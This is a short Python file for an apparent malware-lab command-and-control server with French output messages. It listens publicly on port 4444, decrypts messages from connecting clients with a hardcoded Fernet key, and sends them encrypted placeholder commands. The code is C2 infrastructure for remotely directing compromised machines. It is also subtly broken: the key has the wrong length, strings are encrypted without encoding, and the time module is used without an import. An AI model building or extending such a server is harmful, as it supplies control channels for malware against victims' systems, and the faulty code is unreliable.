# c2_server/public_server.py
import socket
import threading
from cryptography.fernet import Fernet
import base64

class PublicC2Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.crypto = Fernet(base64.urlsafe_b64encode(b"malware_lab_secure_key_2024_32bytes!!"))
        
    def start(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(10)
        
        print(f"🌐 SERVEUR C2 PUBLIC sur {self.host}:{self.port}")
        print("🎯 Prêt pour connexions Internet...")
        
        while True:
            client, addr = server.accept()
            print(f"🎯 NOUVEAU CLIENT: {addr}")
            
            thread = threading.Thread(target=self.handle_client, args=(client, addr))
            thread.daemon = True
            thread.start()
    
    def handle_client(self, client, addr):
        try:
            # Recevoir message chiffré
            encrypted_msg = client.recv(4096)
            message = self.crypto.decrypt(encrypted_msg).decode()
            print(f"📨 {addr} dit: {message}")
            
            # Répondre
            welcome = self.crypto.encrypt("BIENVENUE sur C2 Internet!")
            client.send(welcome)
            
            # Envoyer commandes
            for i in range(3):
                cmd = self.crypto.encrypt(f"command_{i}")
                client.send(cmd)
                time.sleep(2)
                
        except Exception as e:
            print(f"💥 {addr}: {e}")
        finally:
            client.close()

if __name__ == "__main__":
    PublicC2Server().start()
